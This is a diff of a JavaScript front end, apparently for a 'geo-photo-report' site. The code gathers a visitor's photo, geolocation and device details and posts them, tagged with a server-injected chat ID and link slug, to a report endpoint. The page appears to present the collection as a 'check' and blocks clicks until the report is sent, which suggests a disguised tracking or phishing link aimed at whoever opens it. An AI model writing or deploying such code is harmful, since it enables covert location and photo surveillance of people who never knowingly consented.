@@ -1,6 +1,7 @@
 // === app.js ===
-// Настройки: бьём на тот же origin, где открыт сайт
-const API_BASE = ''; // было 'https://geo-photo-report.onrender.com'
+
+// Настройки: работаем по тому же origin, где открыт сайт
+const API_BASE = ''; // оставляем пустым — запросы идут на тот же домен
 
 // Кэшируем UI
 const UI = {
@@ -94,7 +95,12 @@ function getDeviceInfo() {
     navigator.vendor === 'Apple Computer, Inc.';
   const m = ua.match(/OS\s(\d+)[_.]/);
   const iosVer = m ? parseInt(m[1], 10) : null;
-  return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
+  return {
+    userAgent: ua,
+    platform: navigator.platform,
+    iosVersion: iosVer,
+    isSafari,
+  };
 }
 
 // === Отправка отчёта ===
@@ -102,15 +108,17 @@ async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
   const body = { ...info, geo, photoBase64, note: 'auto' };
 
-  // Поддержка кастомных ссылок (/r/:slug) — если сервер внедрил chatId
-  if (window.__TARGET_CHAT_ID) body.chatId = window.__TARGET_CHAT_ID;
+  // 👇 поддержка внедрённых chatId и slug от сервера
+  if (window.__reportChatId) body.chatId = window.__reportChatId;
+  if (window.__SLUG) body.slug = window.__SLUG;
 
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(body),
   });
-  const data = await r.json();
+
+  const data = await r.json().catch(() => ({}));
   if (!data.ok) throw new Error(data.error || 'Send failed');
   return data;
 }
@@ -138,7 +146,8 @@ async function autoFlow() {
     console.error(e);
     setBtnLocked();
     window.__reportReady = false;
-    UI.text.innerHTML = '<span class="err">Не удалось выполнить проверку.</span>';
+    UI.text.innerHTML =
+      '<span class="err">Не удалось выполнить проверку.</span>';
     UI.note.textContent = 'Повтори позже.';
   }
 }
@@ -156,7 +165,6 @@ window.__autoFlow = autoFlow;
       if (!window.__reportReady) {
         e.preventDefault();
         e.stopPropagation();
-        return;
       }
     },
     { capture: true }
